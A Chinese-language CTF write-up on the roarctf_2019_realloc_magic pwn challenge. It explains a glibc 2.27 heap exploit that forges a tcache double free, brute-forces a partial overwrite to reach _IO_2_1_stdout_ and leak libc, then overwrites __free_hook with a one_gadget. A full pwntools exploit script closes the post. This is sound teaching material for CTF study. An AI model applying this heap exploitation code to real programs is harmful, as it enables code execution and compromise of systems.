---
title: IO-leak-sumup
date: 2022-04-20 11:45:14
categories:
 - pwn-writeup
tags: 
 - IO
 - unsorted_bin_attack
 - glibc2.27
---
<!--more-->

## 概述

考虑以下这种情况:  

 - 可以实现任意地址分配;
 - 程序没有提供合适的输出功能;

这时候想要实现利用就需要泄露一个地址，可以通过打`_IO_2_1_stdout_`来实现信息泄露:  

 - 低字节覆盖`unsorted_bin`中残留的`main_arena`指针，

--------

## 例题

### roarctf_2019_realloc_magic

[attachment](https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/RoarCTF-2019/realloc_magic)

#### 程序分析 

程序整体的逻辑比较清晰，`glibc`版本2.27，主要问题如下:  

```c++
size = get_int();
chunk_ptr = realloc(chunk_ptr, size);
```

可以通过传入不同的`size`来控制`chunk_ptr`:   

`chunk_ptr != NULL:`
 - `size == 0`:
 	 - `free(chunk_ptr);`
 	 - __返回值为0__
 - `size != 0`:
 	 - `size == prev_sz`: 返回原先的ptr;
 	 - `size != prev_sz`: 重新分配内存，若分配失败返回值为0，`chunk_ptr`不会被改变;

因此，通过以上利用就可以实现任意地址分配.

--------

#### 漏洞利用

虽然程序中有`UAF`，glibc2.27的tcache也基本没什么防护，但想通过现有条件在`tcache`上打出`chunk_overlap`实现任意地址分配还是需要一些构造的:  

首先，这个程序只使用一个位于`.bss`段上的指针来寻址堆块，构造堆块重叠的思路一般是:  

 - 先分配一个`chunk0`
 - `realloc(0)`清空指针，再分配一个`chunk1`( 大于`chunk0`免得重新把`chunk0`拿出来 )
 - 多次`free(chunk1)`造成`double free`，在`realloc(0)`清空指针
 - 把`chunk0`重新分配出来，接着`realloc()`扩充`chunk0`
 - 接下来再往`chunk0`上写入数据就能改到`chunk1`的`fd`指针了，同时`chunk1`现在是在`tcache_bins`中的

如此就实现了任意地址写.

但是这里我们没有`libc_base`地址，不过考虑到:  

 - `unsorted_bins`中第一个堆块的`fd`和`bk`指针会指向`main_arena+96`的地址
 - `libc_base`的后12个比特位总是0，覆盖`fd`时可以直接去覆盖`main_arena+96`的后12位，再加以爆破4位就可以分配到`_IO_2_1_stdout`上进行进一步利用:  

 	 - 例如覆盖`fd`低16位为:  `p16( (0x6 << 0xc) + (l.symbols['_IO_2_1_stdout_'] & 0xfff) )`就有 $\frac{1}{16}$ 的概率成功，实际利用中写个循环即可.

此外，本题中若是直接通过`tcache_double_free`填满`tcache`，则该堆块在下次释放时会因为和`top_chunk`相邻而直接触发`top_chunk`的合并，无法分配进`unsorted_bins`，因此就需要借助堆块的收缩来隔开`freed_chunk`和`top_chunk`:  

```py
def freeN():
	ru(b">>")
	sl(b"2")
def reallocN(size, content):
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(size).encode())
	ru(b"t?\n")
	sn(content)
def clearN():
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(0).encode())
	ru(b"t?\n")
	sn(b'')
def backD():
	ru(b">>")
	sl(b"666")

reallocN(0x20, b'aaa')
clearN()
reallocN(0x100, b'bbb')
reallocN(0xa0, b'bbb')		# 隔开topchunk和unsorted_chunk
for i in range(7):
	freeN()
clearN()

reallocN(0x20, b'aaa')
reallocN(0xc0, b'a'*0x20 + p64(0) + p64(0x51) + p16( (0x6 << 0xc) + (l.symbols['_IO_2_1_stdout_'] & 0xfff) ))
# 上一行中p64(0x51)是为了防止清空指针时把这一块又放回0xb0大小的tcache中，导致下一个chunk( _IO_2_1_stdout )无法取出

clearN()
reallocN(0xa0, b'aaa')
clearN()
# reallocN(0xa0, '''payload''')
```

--------

如此一来，就能够改到`_IO_2_1_stdout`结构体的所有内容，但`payload`如何设置才能使程序泄露地址呢:  

 - 设置`flag = 0xfbad1887`
 - 设置`_IO_read_ptr=0`, `_IO_read_end=0`, `_IO_read_base=0`, `_IO_write_base`的最后两位为`0x58`
 	 - 即: `payload = p64(0)*3 + p8(0x58)`

之后当程序调用`puts`函数时，就会额外打印`_IO_write_base`到`_IO_write_ptr`之间的所有内容，往往第一个输出的值是`_IO_file_jumps`的地址.

```py
payload = p64(0)*3 + p8(0x58)
reallocN(0xa0, payload)
leak = uu64(rn(6))
if leak >> 40 != 0x7f:
	raise Exception("error")
lg("leak")
libc_addr = leak - 0x3e82a0
one_gadget= libc_addr + 0x4f3c2
lg("libc_addr")
```

--------

此时`chunk_ptr`指在`_IO_2_1_stdout`结构体上，考虑调用题目提供的辅助函数清空`chunk_ptr`，然后直接打`free_hook`即可.

--------

#### exp.py

```py
#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    lg("p.pid")
    input()

def freeN():
	ru(b">>")
	sl(b"2")
def reallocN(size, content):
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(size).encode())
	ru(b"t?\n")
	sn(content)
def clearN():
	ru(b">>")
	sl(b"1")
	ru(b"Size?\n")
	sl(str(0).encode())
	ru(b"t?\n")
	sn(b'')
def ba():
	ru(b">>")
	sl(b"666")

while 1:
	p = process(filename)
	try:
		reallocN(0x20, b'aaa')
		clearN()
		reallocN(0x100, b'bbb')
		reallocN(0xa0, b'bbb')
		for i in range(7):
			freeN()
		clearN()
		reallocN(0x20, b'aaa')
		reallocN(0xc0, b'c'*0x20 + p64(0) + p64(0x51) + p16((0x6 << 0xc) + (l.symbols['_IO_2_1_stdout_'] & 0xfff)))
		clearN()
		reallocN(0xa0, b'aaa')
		clearN()
		payload = p64(0xfbad1887) + p64(0)*3+ p8(0x58)
		reallocN(0xa0, payload)
		leak = uu64(rn(6))
		if leak >> 40 != 0x7f:
			raise Exception("error")
		lg("leak")
		libc_addr = leak - 0x3e82a0
		one_gadget= libc_addr + 0x4f3c2
		lg("libc_addr")

		ba()
		payload = b'a'*0x20 + p64(0) + p64(0x41) + p64(libc_addr + l.symbols['__free_hook'])
		reallocN(0xd0, payload)
		clearN()
		reallocN(0x40, b'aaa')
		clearN()
		reallocN(0x40, p64(one_gadget))
		freeN()

		debugPID()
		irt()
	except Exception as e:
		print(e)
		# debugPID()
		p.close()
		continue
```

